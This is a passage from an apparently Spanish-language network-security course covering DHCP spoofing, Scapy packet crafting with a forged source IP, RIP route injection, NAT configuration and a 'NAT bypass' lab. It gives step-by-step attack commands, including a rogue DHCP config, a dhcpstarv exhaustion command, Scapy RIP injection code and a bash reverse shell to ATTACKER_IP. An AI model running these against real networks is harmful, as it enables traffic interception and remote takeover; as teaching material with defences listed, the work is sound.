#### 1ï¸âƒ£ Crear archivo de configuraciÃ³n `dhcpd.conf`

```bash
sudo nano /etc/dhcp/dhcpd.conf
```

Agrega:

```conf
default-lease-time 600;
max-lease-time 7200;

subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.50 192.168.1.100;
  option routers 192.168.1.200;         # IP del atacante
  option domain-name-servers 192.168.1.200; # DNS del atacante
}
```

ğŸ”§ ExplicaciÃ³n:

- `option routers`: indica a las vÃ­ctimas cuÃ¡l es su puerta de enlace. Ponemos la del atacante.
- `range`: IPs que asignarÃ¡ el servidor DHCP falso.
- `option domain-name-servers`: DNS que usarÃ¡ la vÃ­ctima (el atacante tambiÃ©n puede controlar esto).

---

### ğŸ’¥ Ejemplo prÃ¡ctico: Ataque DHCP Spoofing

#### ğŸ§ª Escenario:

- Red: `192.168.1.0/24`
- Atacante (Kali): `192.168.1.200`
- VÃ­ctima: otro PC que se conecta a la red

---

#### âœ… Paso a paso

##### 1ï¸âƒ£ Habilita reenvÃ­o de IP

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

##### 2ï¸âƒ£ Levanta el servidor DHCP falso

```bash
sudo dhcpd -cf /etc/dhcp/dhcpd.conf
sudo systemctl start isc-dhcp-server
```

Verifica con:

```bash
sudo journalctl -u isc-dhcp-server
```

---

##### 3ï¸âƒ£ Conecta la vÃ­ctima a la red

- Al conectarse, recibirÃ¡ IP + gateway + DNS del **atacante**.
- Puedes comprobar con `ipconfig` (Windows) o `ip a` (Linux).

> ğŸ•µï¸ Ahora **todo el trÃ¡fico pasa por ti**. Puedes hacer sniffing con Wireshark, redirigir DNS, o hacer MITM con `ettercap`.

---

### ğŸ§¼ Opcional: Deshabilitar el DHCP legÃ­timo

En un entorno real, el DHCP del router seguirÃ¡ funcionando, asÃ­ que puedes **desactivarlo** o **agotar sus direcciones** usando:

```bash
sudo dhcpstarv -i eth0
```

Esto envÃ­a muchas solicitudes para llenar la tabla del DHCP real.

---

### ğŸ§  Â¿Para quÃ© se usa DHCP Spoofing?

- **Espionaje de red (sniffing)**: ver trÃ¡fico de usuarios
- **RedirecciÃ³n a sitios falsos (phishing)**
- **Captura de contraseÃ±as (MITM + SSLStrip)**
- **Control de red en entornos inseguros**

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerse del DHCP Spoofing?

| Medida              | ExplicaciÃ³n                                                                    |
| ------------------- | ------------------------------------------------------------------------------ |
| ğŸ”’ DHCP Snooping    | Activarlo en switches administrables. Solo permite DHCP en puertos confiables. |
| ğŸ” VLANs            | Aislar el trÃ¡fico entre segmentos                                              |
| ğŸ•µï¸ Monitoreo de red | Usar herramientas como `arpwatch` o `snort`                                    |
| ğŸ”„ IP estÃ¡tica      | No usar DHCP en dispositivos crÃ­ticos                                          |

---

### âœ… Resumen final

| Concepto        | Detalles                                      |
| --------------- | --------------------------------------------- |
| ğŸ§  QuÃ© es       | Un ataque donde se falsifica un servidor DHCP |
| ğŸ¯ Objetivo     | Tomar control del trÃ¡fico de red              |
| ğŸ§° Herramientas | `isc-dhcp-server`, `dhcpstarv`, `Wireshark`   |
| ğŸ›¡ï¸ Defensa      | DHCP Snooping, VLANs, monitoreo               |

---

[ğŸ”¼](#Ã­ndice)

---

## **815. Encapsulado de paquetes con Scapy**

### ğŸ§  Â¿QuÃ© es Scapy?

**Scapy** es una herramienta escrita en Python que permite crear, enviar, capturar, modificar y analizar **paquetes de red**.

ğŸ”§ A diferencia de otras herramientas que se usan para analizar (como Wireshark), Scapy te permite **crear tus propios paquetes personalizados**, modificarlos a tu gusto y enviarlos por la red.

---

### ğŸ“¦ Â¿QuÃ© es el encapsulado de paquetes?

Cuando un mensaje viaja por la red, se **encapsula** en varias capas (modelo OSI):

- **AplicaciÃ³n**: HTTP, DNS, etc.
- **Transporte**: TCP/UDP
- **Red**: IP
- **Enlace**: Ethernet (MAC)

El encapsulado es poner una **capa dentro de otra**. Por ejemplo:

ğŸ“¦ Ethernet(
Â Â ğŸ“¦ IP(
Â Â Â Â ğŸ“¦ TCP(
Â Â Â Â Â Â ğŸ“¦ Datos
Â Â Â Â )
Â Â )
)

Con **Scapy**, puedes construir cada capa como quieras. Por ejemplo, puedes simular un paquete TCP desde una IP falsa con una MAC falsa.

---

### ğŸ’¾ InstalaciÃ³n de Scapy

#### En Kali Linux / Ubuntu:

```bash
sudo apt update
sudo apt install python3-pip
pip install scapy
```

#### Verifica que funcione:

```bash
python3
>>> from scapy.all import *
>>> IP()
```

---

### ğŸ§ª Ejemplos bÃ¡sicos de encapsulado

#### ğŸ”¹ 1. Crear un paquete IP simple

```python
from scapy.all import *

pkt = IP(dst="8.8.8.8")
pkt.show()
```

ğŸ“˜ Esto crea un paquete IP con destino a `8.8.8.8` (Google DNS).

---

#### ğŸ”¹ 2. Encapsular IP + ICMP (como un ping)

```python
pkt = IP(dst="8.8.8.8")/ICMP()
pkt.show()
send(pkt)
```

ğŸ¯ Esto es equivalente a un `ping 8.8.8.8` pero hecho manualmente.

---

#### ğŸ”¹ 3. Encapsular Ethernet + IP + TCP

```python
pkt = Ether()/IP(dst="192.168.1.1")/TCP(dport=80)
pkt.show()
sendp(pkt)
```

ğŸ” `Ether()` es la capa de enlace, `IP()` la de red, y `TCP()` la de transporte.

`sendp()` se usa para enviar a nivel de enlace.

---

### âœ… Laboratorio completo: Enviar un paquete TCP falso

#### ğŸ¯ Objetivo:

Simular un paquete TCP SYN (inicio de conexiÃ³n) desde una IP falsa.

---

##### 1ï¸âƒ£ CÃ³digo completo en Python con Scapy

```python
from scapy.all import *

# Crear un paquete con IP falsa
fake_ip = "10.0.0.99"
target_ip = "192.168.1.1"
target_port = 80

# Crea el paquete IP
ip = IP(src=fake_ip, dst=target_ip)

# Crea el paquete TCP
tcp = TCP(sport=12345, dport=target_port, flags="S", seq=1000)

# Encapsula y muestra el paquete
pkt = ip/tcp
pkt.show()

# Enviar el paquete
send(pkt, verbose=0)

print(f"Paquete TCP SYN enviado desde {fake_ip} a {target_ip}:{target_port}")
```

---

##### 2ï¸âƒ£ Â¿QuÃ© hace este script?

- EnvÃ­a un paquete TCP **SYN** (inicio de conexiÃ³n)
- Falsifica la IP de origen (`10.0.0.99`)
- El destino cree que ese host intenta conectarse

ğŸ›‘ Como la IP es falsa, no habrÃ¡ respuesta vÃ¡lida (porque la IP falsa no puede recibir paquetes), pero el ataque puede usarse para:

- Hacer un escaneo
- Confundir firewalls
- Atacar con SYN Flood (muchos SYN falsos)

---

### ğŸ§ª Otros usos de Scapy

| AcciÃ³n                 | Ejemplo                                       |
| ---------------------- | --------------------------------------------- |
| ğŸ“¡ Sniffing            | `sniff(filter="tcp", count=10)`               |
| ğŸ”„ ModificaciÃ³n        | Modificar campos del paquete como TTL o flags |
| ğŸ’¥ Ataques             | TCP reset, DNS spoof, ARP spoofing            |
| ğŸ›¡ï¸ Pruebas de firewall | Ver quÃ© tipo de trÃ¡fico bloquea o permite     |

---

### ğŸ›¡ï¸ PrecauciÃ³n

> El envÃ­o de paquetes falsos en redes que no te pertenecen puede ser **ilegal o considerado malicioso**. Este conocimiento debe usarse **solo con fines educativos y en entornos controlados o de laboratorio.**

---

### âœ… ConclusiÃ³n

| Concepto       | ExplicaciÃ³n                                             |
| -------------- | ------------------------------------------------------- |
| ğŸ“¦ Encapsulado | Construir capas de red anidadas: Ethernet â†’ IP â†’ TCP... |
| âš’ï¸ Herramienta | Scapy (Python)                                          |
| ğŸ”¬ Usos        | AnÃ¡lisis, pruebas, ataques, escaneo, simulaciÃ³n         |
| ğŸ“ InstalaciÃ³n | `pip install scapy`                                     |
| ğŸ¯ Ejemplo     | Enviar un TCP SYN falso con IP de origen modificada     |

---

[ğŸ”¼](#Ã­ndice)

---

## **816. Ataques a protocolos de enrutamiento**

### ğŸ§  Â¿QuÃ© son los protocolos de enrutamiento?

Los **protocolos de enrutamiento** permiten que los routers compartan informaciÃ³n sobre las rutas disponibles para enviar datos entre diferentes redes. Algunos protocolos comunes son:

| Protocolo | Tipo                           | Ejemplo                  |
| --------- | ------------------------------ | ------------------------ |
| RIP       | Interior / vector de distancia | PequeÃ±as redes           |
| OSPF      | Interior / estado de enlace    | Redes grandes y modernas |
| BGP       | Exterior / polÃ­ticas complejas | Internet (entre ISP)     |

Estos protocolos **intercambian informaciÃ³n** como rutas, mÃ©tricas, tiempos, etc.

---

### ğŸ’£ Â¿QuÃ© es un ataque a protocolos de enrutamiento?

Un **ataque a protocolo de enrutamiento** ocurre cuando un atacante **interfiere, modifica o falsifica** la informaciÃ³n de enrutamiento que intercambian los routers, con el objetivo de:

- Redirigir trÃ¡fico
- Interrumpir la red (DoS)
- Interceptar informaciÃ³n (MITM)
- Dividir la red (blackhole)

---

### ğŸ¯ Tipos comunes de ataques

| Ataque                    | DescripciÃ³n                                                      | Ejemplo                          |
| ------------------------- | ---------------------------------------------------------------- | -------------------------------- |
| **Rogue Router**          | El atacante introduce un router falso en la red                  | Falsifica rutas                  |
| **Route Injection**       | Inserta rutas maliciosas en RIP/OSPF                             | DesvÃ­a trÃ¡fico                   |
| **Blackhole Routing**     | Se anuncian rutas falsas con mejor mÃ©trica y se descarta trÃ¡fico | Causa pÃ©rdida                    |
| **BGP Hijacking**         | Se anuncia posesiÃ³n de redes IP que no son del atacante          | Afecta a Internet                |
| **Replay Attack**         | ReenvÃ­o de actualizaciones viejas                                | Envenenamiento de tabla de rutas |
| **DoS por actualizaciÃ³n** | Saturar con actualizaciones falsas                               | Causa inestabilidad              |

---

### ğŸ§° Herramientas utilizadas en ataques

| Herramienta          | Uso                                                       |
| -------------------- | --------------------------------------------------------- |
| **Scapy**            | Crear paquetes RIP/OSPF falsos                            |
| **Yersinia**         | Ataques a protocolos de capa 2 y 3 (RIP, OSPF, STP, etc.) |
| **Bettercap**        | MITM avanzado con envenenamiento                          |
| **BGP Hijack Tools** | MÃ¡s complejas, usadas en ISP o entornos simulados         |

---

#### ğŸ’» InstalaciÃ³n de Yersinia (Kali Linux)

Yersinia es una herramienta muy Ãºtil para ataques a protocolos como RIP y OSPF.

##### ğŸ”§ Instalar en Kali Linux:

```bash
sudo apt update
sudo apt install yersinia
```

---

#### ğŸ”¬ Laboratorio simple: Ataque a RIP con Yersinia

##### ğŸ¯ Objetivo:

Introducir rutas falsas a travÃ©s del protocolo RIP usando **Yersinia** en un entorno de laboratorio (por ejemplo, GNS3 o Packet Tracer + Kali Linux).

##### ğŸ§ª Escenario:

- Red que usa **RIP** entre dos routers reales o simulados
- Kali Linux se conecta a la red como un host (atacante)

---

#### ğŸ§± Paso a paso del ataque

##### 1ï¸âƒ£ Iniciar Yersinia en modo GUI

```bash
sudo yersinia -G
```

VerÃ¡s una interfaz grÃ¡fica con opciones.

---

##### 2ï¸âƒ£ Elegir protocolo RIP

En el menÃº:

`Launch attack` â†’ `RIP` â†’ Opciones disponibles:

- **Send RIP v1/v2 request**
- **Send RIP route injection**

Elige **"Send RIP route injection"**

---

##### 3ï¸âƒ£ Configurar ruta falsa

- DirecciÃ³n destino: 192.168.100.0
- MÃ¡scara: 255.255.255.0
- Next-hop: tu IP (Kali)
- MÃ©trica: 1 (mejor que la real)

Esto engaÃ±a al router para pensar que **la mejor ruta** hacia 192.168.100.0 es por ti.

---

##### 4ï¸âƒ£ Ejecutar ataque

Haz clic en "Send" para enviar la ruta falsa.

El router vÃ­ctima agregarÃ¡ esa ruta a su tabla, y **todo el trÃ¡fico hacia esa red irÃ¡ a ti**, el atacante.

---

#### ğŸ” VerificaciÃ³n:

En el router vÃ­ctima, usa comandos como:

```bash
show ip route
```

O en Linux:

```bash
route -n
```

VerÃ¡s que la ruta fue modificada.

---

### ğŸ” Â¿CÃ³mo protegerse?

| Defensa                              | DescripciÃ³n                                         |
| ------------------------------------ | --------------------------------------------------- |
| ğŸ”’ AutenticaciÃ³n en RIP/OSPF         | Usar claves o MD5 para rutas                        |
| ğŸ¯ Filtrado de rutas                 | Validar rutas recibidas                             |
| ğŸ§± SegmentaciÃ³n de red               | VLANs y ACLs para evitar acceso a routers           |
| ğŸ“ˆ Monitoreo                         | Detectar cambios anÃ³malos de rutas (Zabbix, Nagios) |
| ğŸš« Deshabilitar protocolos no usados | Si no usas RIP, Â¡desactÃ­valo!                       |

---

### ğŸ§© Ejemplo completo: Ataque a RIP con Yersinia

#### ğŸ“œ CÃ³digo alternativo con Scapy (mÃ¡s tÃ©cnico):

```python
from scapy.all import *

rip_packet = IP(dst="224.0.0.9")/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/RIPEntry(af=2, addr="192.168.100.0", mask="255.255.255.0", metric=1)

send(rip_packet)
```

ğŸ”§ Esto crea un **paquete RIP v2** anunciando una red falsa y lo envÃ­a a la direcciÃ³n multicast que usan los routers para RIP.

---

### âœ… Resumen

| Concepto        | Detalles                                         |
| --------------- | ------------------------------------------------ |
| ğŸ“¦ QuÃ© es       | Ataque que manipula protocolos de enrutamiento   |
| ğŸ¯ Objetivo     | Redirigir, bloquear o capturar trÃ¡fico           |
| ğŸ§° Herramientas | Yersinia, Scapy, Bettercap                       |
| âš™ï¸ InstalaciÃ³n  | `apt install yersinia`                           |
| ğŸ§ª Laboratorio  | Ruta falsa vÃ­a RIP con Kali + router             |
| ğŸ›¡ï¸ ProtecciÃ³n   | AutenticaciÃ³n, filtrado, monitoreo, segmentaciÃ³n |

---

[ğŸ”¼](#Ã­ndice)

---

## **817. VerificaciÃ³n de ataques a protocolos de enrutamiento**

### ğŸ§  Â¿QuÃ© es la verificaciÃ³n de ataques a protocolos de enrutamiento?

DespuÃ©s de realizar un ataque (simulado) a un protocolo de enrutamiento como **RIP, OSPF o BGP**, necesitamos **verificar si el ataque fue exitoso**.

Esto implica revisar:

- Las **tablas de enrutamiento** de los routers o sistemas afectados.
- El **flujo de trÃ¡fico** (Â¿ha sido desviado?).
- La **resoluciÃ³n de rutas** (Â¿estÃ¡n manipuladas?).
- Los **paquetes capturados** (Â¿aparecen rutas falsas?).

---

### ğŸ” Â¿QuÃ© protocolos se pueden atacar y verificar?

| Protocolo | Tipo                   | Ejemplo de ataque                              |
| --------- | ---------------------- | ---------------------------------------------- |
| RIP       | Interior, simple       | InyecciÃ³n de rutas falsas con mÃ©trica baja     |
| OSPF      | Interior, estructurado | ManipulaciÃ³n de LSA (Link-State Advertisement) |
| BGP       | Exterior, global       | BGP hijacking: fingir que controlas una red    |

---

### ğŸ§° Herramientas para verificar ataques

| Herramienta             | Uso principal                                 |
| ----------------------- | --------------------------------------------- |
| ğŸ”§ `show ip route`      | Ver tabla de rutas en routers (Cisco/Juniper) |
| ğŸ Scapy                | Capturar/leer paquetes                        |
| ğŸ–¥ï¸ Wireshark            | Analizar trÃ¡fico en detalle                   |
| ğŸ›¡ï¸ ip route / netstat   | Ver rutas en Linux                            |
| ğŸ§  Bettercap / Yersinia | Herramientas de ataque y anÃ¡lisis             |

---

### ğŸ§ª Ejemplo bÃ¡sico: Ataque y verificaciÃ³n en RIP

#### ğŸ¯ Objetivo:

Enviar rutas falsas usando **Yersinia** y verificar si un router o PC las acepta.

---

#### ğŸ”§ Requisitos:

- 1 router o emulador (GNS3 o Packet Tracer)
- 1 mÃ¡quina Kali Linux (con Yersinia instalado)
- 1 vÃ­ctima que use **RIP**

---

#### ğŸ” Paso 1: Enviar una ruta falsa con Yersinia

1. Abre Yersinia:

```bash
sudo yersinia -G
```

2. Elige el protocolo **RIP**
3. Selecciona **â€œSend RIP route injectionâ€**
4. Introduce una ruta falsa (ej. `192.168.100.0/24`) con mÃ©trica 1
5. EnvÃ­a el paquete

---

#### ğŸ” Paso 2: Verificar desde el router vÃ­ctima

##### En un router Cisco:

```bash
show ip route
```

ğŸ” Busca si aparece una entrada tipo:

```
R    192.168.100.0/24 [120/1] via 192.168.1.10, 00:00:22, FastEthernet0/0
```

ğŸ“Œ La letra **R** indica que vino por RIP

ğŸ“Œ La **mÃ©trica** indica cuÃ¡n preferida es (menor = mejor)

---

#### ğŸ” Paso 3: Verificar desde un host Linux conectado

1. Ejecuta:

```bash
ip route
```

2. O si estÃ¡ mÃ¡s antigua la distro:

```bash
route -n
```

ğŸ“ Verifica si el sistema cree que puede llegar a `192.168.100.0/24` por una nueva ruta.

---

#### ğŸ” Paso 4: Verificar con Wireshark

1. Abre Wireshark
2. Filtra con:

```
rip || udp.port == 520
```

3. Observa si aparecen paquetes con rutas no esperadas

ğŸ”¬ Esto permite confirmar si la vÃ­ctima **recibiÃ³** y **aceptÃ³** la ruta falsa.

---

### ğŸ§ª Ejemplo completo en laboratorio

#### Escenario:

- Router A (192.168.1.1) conectado con Kali Linux (192.168.1.100)
- Kali inyecta ruta falsa a red inexistente `10.10.10.0/24`
- Verificamos si Router A cree que esa red es alcanzable

---

#### ğŸ“œ Paso a paso:

##### 1. En Kali (con Scapy):

```python
from scapy.all import *

rip_packet = IP(dst="224.0.0.9")/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/RIPEntry(af=2, addr="10.10.10.0", mask="255.255.255.0", metric=1)

send(rip_packet)
```

Este comando:

- EnvÃ­a un anuncio RIP v2
- Con una ruta inventada a `10.10.10.0/24`
- MÃ©trica 1 = muy confiable

---

##### 2. En el Router:

```bash
show ip route
```

Si ves algo asÃ­:

```
R    10.10.10.0/24 [120/1] via 192.168.1.100
```

âœ… Ataque verificado: la ruta fue aceptada.

---

##### 3. Verifica trÃ¡fico real:

Desde otro host, haz ping:

```bash
ping 10.10.10.1
```

âš ï¸ Puede fallar (la red no existe), pero **el trÃ¡fico se enviarÃ¡ igual**, confirmando que el router fue engaÃ±ado.

---

### ğŸ” Â¿CÃ³mo prevenir esto?

| Defensa                 | QuÃ© hace                                                    |
| ----------------------- | ----------------------------------------------------------- |
| ğŸ”’ AutenticaciÃ³n de RIP | Evita paquetes falsos (clave MD5 o simple)                  |
| ğŸ¯ Access Lists         | Solo permitir actualizaciones de routers vÃ¡lidos            |
| ğŸ” Monitoreo constante  | Usar SNMP, Syslog, o NMS para detectar rutas sospechosas    |
| ğŸ“‰ MÃ©tricas seguras     | Evitar aceptar rutas de mÃ©trica sospechosamente baja        |
| ğŸ§± SeparaciÃ³n de red    | No mezclar routers con dispositivos que no deben enviar RIP |

---

### âœ… Resumen final

| Tema            | Detalle                                |
| --------------- | -------------------------------------- |
| ğŸ“¦ Ataques      | Consisten en insertar rutas falsas     |
| ğŸ” VerificaciÃ³n | Tabla de rutas, trÃ¡fico, Wireshark     |
| âš’ï¸ Herramientas | Yersinia, Scapy, Wireshark             |
| ğŸ’¡ Ejemplo      | InyecciÃ³n de red falsa `10.10.10.0/24` |
| ğŸ” Defensa      | AutenticaciÃ³n, ACL, monitoreo          |

---

[ğŸ”¼](#Ã­ndice)

---

## **818. AnÃ¡lisis de NAT**

### ğŸ§  Â¿QuÃ© es NAT?

**NAT (Network Address Translation)** es una tÃ©cnica que permite **traducir direcciones IP privadas a pÃºblicas** (y viceversa) para permitir que mÃºltiples dispositivos dentro de una red local accedan a Internet usando **una sola IP pÃºblica**.

---

### ğŸ§± Â¿Por quÃ© se usa NAT?

1. **Escasez de direcciones IPv4 pÃºblicas**
2. **Seguridad**: oculta IPs privadas del mundo exterior
3. **Compartir conexiÃ³n a Internet** con una sola IP pÃºblica

---

#### ğŸ” Tipos de NAT

| Tipo de NAT            | DescripciÃ³n                                                              | Ejemplo                               |
| ---------------------- | ------------------------------------------------------------------------ | ------------------------------------- |
| **Static NAT**         | Una IP privada siempre se traduce a la misma IP pÃºblica                  | Servidor interno con IP fija          |
| **Dynamic NAT**        | La IP privada se traduce a una IP pÃºblica libre de un pool               | Como un hotel o red compartida        |
| **PAT (NAT Overload)** | Muchas IPs privadas comparten **una sola IP pÃºblica** usando **puertos** | Red domÃ©stica con solo una IP pÃºblica |

ğŸ”§ **PAT** es el mÃ¡s comÃºn (y el que usamos todos en casa).

---

### ğŸ§° Â¿CÃ³mo se instala NAT?

NAT no se instala como un software: **es una funciÃ³n del router** o del sistema operativo.
Puedes configurarlo en:

- **Routers fÃ­sicos** (como Cisco, MikroTik)
- **Linux** (usando `iptables`)
- **Windows** (con software adicional)
- **Virtualizadores/laboratorios** como **GNS3, Packet Tracer, VirtualBox**

---

#### ğŸ§ InstalaciÃ³n de NAT en Linux (modo laboratorio)

Vamos a usar Linux (por ejemplo, Kali o Ubuntu) para simular un router con NAT usando `iptables`.

#### âœ… Requisitos:

- Una interfaz conectada a la LAN (ej: `eth0`)
- Una interfaz conectada a Internet o red externa (ej: `eth1`)

---

##### ğŸ› ï¸ Paso 1: Activar redireccionamiento IP

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

O permanente:

```bash
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

---

##### ğŸ› ï¸ Paso 2: Configurar NAT con iptables

```bash
sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
```

ğŸ”¹ Esto crea un **NAT tipo PAT** (overload), traduciendo todas las IPs internas a la IP pÃºblica de `eth1`.

---

##### ğŸ› ï¸ Paso 3: Permitir trÃ¡fico de reenvÃ­o

```bash
sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
sudo iptables -A FORWARD -i eth1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

---

### ğŸ‘ï¸â€ğŸ—¨ï¸ AnÃ¡lisis de NAT: Â¿cÃ³mo saber si estÃ¡ funcionando?

Puedes analizar NAT en dos niveles:

---

#### ğŸ§ª A. Desde el cliente (host interno)

1. Ver IP privada:

```bash
ip a
```

2. Hacer ping a Internet:

```bash
ping 8.8.8.8
```

3. Ver si la IP pÃºblica se muestra en servicios como:

```bash
curl ifconfig.me
```

ğŸ” VerÃ¡s tu IP pÃºblica aunque tu PC tenga una IP privada.

---

#### ğŸ§ª B. Desde el "router" con NAT

Usa `iptables` para ver traducciones activas:

```bash
sudo iptables -t nat -L -n -v
```

Y para ver conexiones activas (con NAT aplicado):

```bash
sudo conntrack -L
```

(Instala conntrack con: `sudo apt install conntrack`)

---

### ğŸ“Š Ver con Wireshark

Captura en la interfaz **interna (eth0)** y **externa (eth1)** y compara:

| Interfaz | DirecciÃ³n origen                                |
| -------- | ----------------------------------------------- |
| eth0     | IP privada (ej. 192.168.1.10)                   |
| eth1     | IP pÃºblica o IP de salida NAT (ej. 200.50.60.1) |

Esto confirma que el NAT estÃ¡ funcionando correctamente.

---

### âœ… Ejemplo completo de laboratorio

#### ğŸ¯ Objetivo:

Simular NAT en un entorno virtual donde una mÃ¡quina con IP privada navega a Internet a travÃ©s de otra que hace de "router".

---

#### ğŸ”§ Escenario:

- PC1: IP 192.168.10.10 (cliente)
- PC2: Linux NAT router con 2 interfaces

  - eth0: 192.168.10.1 (LAN)
  - eth1: 10.0.2.15 (salida a Internet / NAT)

- Internet: simulada con VirtualBox NAT o real red externa

---

#### ğŸ§± Paso a paso:

1. **Configura PC1**:

   - IP: `192.168.10.10`
   - Gateway: `192.168.10.1`

2. **Configura PC2 (router Linux)**:

   - eth0: `192.168.10.1`
   - eth1: IP que tenga salida a Internet (NAT en VirtualBox)

3. **Activa NAT en PC2**:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
sudo iptables -A FORWARD -i eth1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

4. **Prueba desde PC1**:

```bash
ping 8.8.8.8
curl ifconfig.me
```

ğŸ” DeberÃ­as ver trÃ¡fico saliendo a Internet con **una IP pÃºblica**, aunque PC1 tiene una privada.

---

### ğŸ” Ventajas del uso de NAT

| Ventaja         | ExplicaciÃ³n                                 |
| --------------- | ------------------------------------------- |
| ğŸ§± Seguridad    | Oculta la red interna del exterior          |
| ğŸŒ Conectividad | Permite navegar con solo una IP pÃºblica     |
| ğŸ’µ Ahorro       | No necesitas comprar mÃºltiples IP pÃºblicas  |
| ğŸ“Š Control      | Puedes hacer port forwarding, logging, etc. |

---

### âŒ Desventajas o limitaciones

| Desventaja                                                      | ExplicaciÃ³n                                  |
| --------------------------------------------------------------- | -------------------------------------------- |
| âŒ Problemas con VoIP o juegos                                  | Algunos protocolos no funcionan bien con NAT |
| âŒ No sirve para servicios entrantes sin redirecciÃ³n de puertos |                                              |
| âŒ Complica diagnÃ³sticos de red                                 |                                              |

---

### ğŸ§  Resumen final

| Tema         | Contenido                                               |
| ------------ | ------------------------------------------------------- |
| Â¿QuÃ© es NAT? | TraducciÃ³n de IP privada â†” pÃºblica                      |
| Tipos        | Static, Dynamic, PAT                                    |
| InstalaciÃ³n  | En routers o Linux (iptables)                           |
| VerificaciÃ³n | Con `iptables`, `conntrack`, Wireshark                  |
| Laboratorio  | Cliente con IP privada accede a Internet vÃ­a PC con NAT |

---

[ğŸ”¼](#Ã­ndice)

---

## **819. Ataque NAT Bypass**

### ğŸ§  Â¿QuÃ© es un Ataque NAT Bypass?

Un **NAT Bypass Attack** (tambiÃ©n llamado **NAT traversal**, aunque ese tÃ©rmino tiene otros matices) es un tipo de ataque que busca **saltar las restricciones del NAT**, es decir, **comunicarse con dispositivos detrÃ¡s de un NAT sin tener acceso directo a ellos**.

En condiciones normales, los dispositivos detrÃ¡s de un NAT **no pueden ser accedidos desde Internet**, a menos que el router tenga configurado un redireccionamiento de puertos (port forwarding). El **ataque NAT Bypass trata de saltarse esa protecciÃ³n.**

---

### ğŸ¯ Objetivo del ataque

- Comunicarte con un dispositivo oculto detrÃ¡s de NAT **sin autorizaciÃ³n**.
- Usar **tÃºneles, protocolos o errores de configuraciÃ³n** para **hacerlo accesible desde fuera**.
- A veces se usa para que un atacante **controle una mÃ¡quina vÃ­ctima detrÃ¡s de NAT**.

---

### ğŸš¨ Â¿QuÃ© vulnerabilidades aprovecha?

- Uso indebido de protocolos como **UPnP** (Universal Plug and Play)
- Aplicaciones que **hacen tÃºneles inversos automÃ¡ticos**
- **ReenvÃ­o de puertos habilitado por error**
- **STUN/TURN/ICE** mal configurados
- **Malware** que crea su propio canal hacia el atacante
- Ataques tipo **reverse shell** y **pivoteo**

---

### ğŸ› ï¸ Â¿CÃ³mo se prepara un entorno para analizar un NAT Bypass?

#### ğŸ§ª Laboratorio con VirtualBox (o GNS3)

**Requisitos:**

- Kali Linux (atacante)
- PC vÃ­ctima detrÃ¡s de NAT (Ubuntu, Windows o cualquier OS)
- Red NAT simulada (VirtualBox, router virtual, etc.)

---

### ğŸ“¦ InstalaciÃ³n y preparaciÃ³n del entorno

#### ğŸ”Œ Paso 1: Configurar NAT

1. Crea 2 mÃ¡quinas virtuales:

   - Kali Linux â†’ Conectada a Internet (modo "bridged" o NAT)
   - Ubuntu (vÃ­ctima) â†’ Solo tiene acceso a Internet vÃ­a NAT

2. Verifica que **la vÃ­ctima no tenga puertos accesibles desde el exterior**.

---

#### ğŸ”§ Paso 2: Instalar herramientas necesarias

##### En Kali (atacante):

```bash
sudo apt update
sudo apt install netcat nmap socat upnp-client
```

##### En vÃ­ctima (Ubuntu):

```bash
sudo apt install netcat socat curl
```

---

### ğŸ’¥ Ejemplo completo: Ataque NAT Bypass usando tÃºnel inverso con Netcat

#### ğŸ¯ Objetivo:

Conectarse desde Kali a una shell en la mÃ¡quina vÃ­ctima **aunque estÃ© detrÃ¡s de NAT**, usando una **reverse shell**.

---

##### ğŸ‘£ Paso 1: En Kali (atacante) â€“ escuchar

Abrimos un puerto para que la vÃ­ctima se conecte:

```bash
nc -lvnp 4444
```

Esto crea un "listener" que espera conexiones entrantes en el puerto 4444.

---

##### ğŸ‘£ Paso 2: En la vÃ­ctima â€“ ejecutar reverse shell

Ejecutamos desde la mÃ¡quina detrÃ¡s del NAT:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Reemplaza `ATTACKER_IP` por la IP pÃºblica o local de la Kali Linux.

Este comando le dice a la mÃ¡quina vÃ­ctima que se **conecte hacia el atacante**, y redireccione su terminal (shell) a travÃ©s del canal TCP.

---

### âœ… Resultado

Desde Kali verÃ¡s aparecer una sesiÃ³n:

```
connect to [your.ip] from (victim.ip) 12345
```

Ahora tienes una **shell interactiva de la vÃ­ctima**, aunque estaba **protegida detrÃ¡s de NAT**.

---

### ğŸ¯ Alternativa: UPnP Attack (puede habilitar NAT bypass)

Algunos routers permiten, mediante **UPnP**, abrir puertos sin autenticar. Puedes probar desde Kali:

```bash
upnpc -l          # Lista puertos abiertos
upnpc -a 192.168.1.10 22 2222 TCP   # Redirige puerto 2222 del router al puerto 22 de la vÃ­ctima
```

âš ï¸ Esto depende del router, pero **UPnP mal configurado es una gran puerta trasera**.

---

### ğŸ” Â¿CÃ³mo detectar un NAT Bypass?

Desde el lado de la red:

- Ver conexiones **salientes extraÃ±as** desde dispositivos internos
- Usar herramientas como:

```bash
netstat -tunap
```

- Revisar registros de router o firewall: Â¿algÃºn puerto fue abierto sin permiso?

---

### ğŸ” Â¿CÃ³mo prevenir ataques NAT Bypass?

| RecomendaciÃ³n           | ExplicaciÃ³n                                                   |
| ----------------------- | ------------------------------------------------------------- |
| âŒ Deshabilitar UPnP    | Muchos routers permiten abrir puertos automÃ¡ticamente         |
| ğŸ” Firewall estricto    | Limita conexiones salientes y entrantes                       |
| ğŸ” Monitoreo de trÃ¡fico | Detectar conexiones inusuales hacia Internet                  |
| âœ… Actualizaciones      | Malware que hace NAT bypass explota vulnerabilidades antiguas |
| ğŸ›‘ Filtrar comandos     | No permitir que scripts o apps lancen shells reversas         |

---

### ğŸ§  Resumen

| Tema              | Detalle                                                               |
| ----------------- | --------------------------------------------------------------------- |
